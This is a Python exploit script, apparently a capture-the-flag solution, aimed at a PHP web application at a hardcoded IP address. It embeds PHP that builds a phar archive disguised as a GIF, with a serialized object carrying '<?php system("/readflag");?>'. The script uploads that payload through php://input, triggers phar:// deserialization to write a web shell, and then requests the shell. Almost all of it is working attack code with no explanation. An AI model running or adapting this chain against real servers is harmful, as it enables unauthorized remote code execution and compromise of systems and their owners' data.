import requests
import base64
import gnureadline
"""
evil.php # 利用这个生成phar.phar
<?php
class Temp{
	var $content = '';
	var $pattern = '';
	var $suffix = '';
    function __destruct()
    {
    	echo '123';
	}
}
$phar = new Phar('phar.phar');
$phar -> stopBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar -> addFromString('test.txt','test');
$object = new Temp();
$object -> suffix = '.php';
$object -> pattern = '/{{([a-z]+)}}/';
$object -> content = '<?php system("/readflag");?>';
$phar -> setMetadata($object);
$phar -> stopBuffering();
"""

print('====upload phar.phar====')
base = 'http://49.234.101.119/'
url = base + '?var[template][tp4]=php://input&tp=tp4'
# phar.phar 的base64
payload = base64.b64decode(b'R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqzAAAAAQAAABEAAAABAAAAAAB9AAAATzo0OiJUZW1wIjozOntzOjc6ImNvbnRlbnQiO3M6Mjg6Ijw/cGhwIHN5c3RlbSgiL3JlYWRmbGFnIik7Pz4iO3M6NzoicGF0dGVybiI7czoxNDoiL3t7KFthLXpdKyl9fS8iO3M6Njoic3VmZml4IjtzOjQ6Ii5waHAiO30IAAAAdGVzdC50eHQEAAAAbf/MXwQAAAAMfn/YpAEAAAAAAAB0ZXN0M299J45rTFlRHYZOcFd+PPM6tusCAAAAR0JNQg==')
r = requests.get(url,data=payload)
directory = r.content.decode()[41:]

print('====phar://====')
url = base + '?var[template][tp4]=phar://{}&tp=tp4'.format(directory)
r = requests.get(url)
directory = r.content.decode()[158:]

print('====getshell====')
url = base + directory
r = requests.get(url)
print(r.content)

